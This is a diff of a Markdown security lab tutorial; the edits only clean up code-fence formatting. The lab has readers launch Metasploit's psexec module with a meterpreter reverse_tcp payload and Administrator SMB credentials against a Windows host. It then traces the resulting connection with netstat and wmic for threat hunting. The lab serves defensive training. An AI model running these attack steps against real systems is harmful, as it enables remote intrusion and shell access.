@@ -7,19 +7,13 @@ In this hands-on lab, we'll create and execute malware in a controlled environme
 ### Initial Setup
 Begin by elevating your privileges to root access:
 
-<details>
-<summary>Click to expand setup commands</summary>
 ```bash
 sudo su -
 ```
 
-</details>
-
 Launch the Metasploit Framework console:
 
-``` 
-bash
-
+``` bash
 msfconsole -q
 ```
 
@@ -29,27 +23,22 @@ Once connected, your terminal prompt will change to indicate you're in the Metas
 
 Configuring the Exploit
 Select the Windows SMB exploit module:
-``` 
-bash
+``` bash
 use exploit/windows/smb/psexec
 ```
 
 Configure the payload type:
-``` 
-bash
+``` bash
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 Specify the target Windows system's IP address:
-``` 
-bash
+``` bash
 set RHOST (YOUR IP ADDRESS)
 ```
 
 Set the SMB credentials for authentication:
-``` 
-bash
-
+``` bash
 set SMBUSER Administrator
 set SMBPASS password1234
 ```
@@ -59,8 +48,7 @@ Security Note: Use the password you configured earlier in the lab. Ensure you're
 After configuration, your console should display all the set parameters.
 
 Execute the attack:
-```
-bash 
+```bash 
 exploit
 ```
 ## Network Connection Analysis
@@ -72,7 +60,6 @@ While this lab environment is simplified, two critical commands help detect atta
 ## Investigating the Malware Connection
 Open a Windows PowerShell window and examine all network connections:
 ``` powershell
-
 netstat -naob
 ```
 
@@ -86,7 +73,6 @@ Focus on the ESTABLISHED connections, particularly the connection using port 444
 For additional context about connection endpoints, use:
 
 ``` powershell
-
 netstat -f
 ```
 This displays fully qualified domain names (FQDNs), helping you identify legitimate connections you can filter out during analysis.
@@ -98,7 +84,6 @@ The output will show loaded DLLs, though in this case, you won't find much suspi
 
 Dig deeper using Windows Management Instrumentation Command-line (WMIC):
 ``` powershell
-
 wmic process where processid=[PID] get commandline
 ```
 
@@ -106,7 +91,6 @@ This reveals that the malicious file was launched directly from the command line
 
 Identify the parent process that spawned your malware:
 ``` powershell
-
 wmic process get name,parentprocessid,processid | select-string [PID]
 ```
 
@@ -122,5 +106,3 @@ Through this systematic investigation, you've completed the following detection 
 Note: Your search may return additional processes launched by the command line interpreter, this is normal and reflects typical system activity.
 
 This methodology demonstrates the fundamental process of threat hunting: starting with network indicators and systematically tracing back to the initial point of compromise.
-
-
